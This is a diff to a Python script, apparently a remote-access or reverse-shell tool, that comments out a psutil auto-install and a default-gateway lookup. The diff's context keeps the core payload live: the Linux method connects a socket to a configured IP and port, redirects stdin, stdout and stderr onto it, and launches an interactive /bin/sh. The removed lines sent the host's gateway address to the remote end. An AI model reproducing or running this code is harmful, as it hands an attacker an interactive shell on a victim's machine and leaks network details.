@@ -1,8 +1,8 @@
 import os
 import subprocess
 import sys
-os.system("pip install psutil")
-import psutil
+#os.system("pip install psutil")
+#import psutil
 import struct
 import platform
 import socket
@@ -87,30 +87,29 @@ class Details:
 
     #######LINUX###############
     def linux(self):
-        os.system("pip install psutil")
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((self.ip,self.port))
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
-        gateway = self.get_default_gateway()
-        s.send(gateway.encode())
+        #gateway = self.get_default_gateway()
+        #s.send(gateway.encode())
         subprocess.call(["/bin/sh","-i"])
 
 
-    def get_default_gateway(self):  #### Gateway
-        """This function will identify the Default Gateway of the Device """
-        if platform.system() == "Windows":
-            for interface, stats in psutil.net_if_stats().items():
-                if "defaultgateway" in stats:
-                    return stats["defaultgateway"]
-        elif platform.system() == "Linux":
-            with open("/proc/net/route") as route_file:
-                for line in route_file.readlines():
-                    fields = line.strip().split()
-                    if fields[1] == "00000000":
-                        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
-        return None
+#    def get_default_gateway(self):  #### Gateway
+#        """This function will identify the Default Gateway of the Device """
+#        if platform.system() == "Windows":
+#            for interface, stats in psutil.net_if_stats().items():
+#                if "defaultgateway" in stats:
+#                    return stats["defaultgateway"]
+#        elif platform.system() == "Linux":
+#            with open("/proc/net/route") as route_file:
+#                for line in route_file.readlines():
+#                    fields = line.strip().split()
+#                    if fields[1] == "00000000":
+#                        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+#        return None
 
     ## TO IDENTIFY THE HOST OS
     def os_define(self):
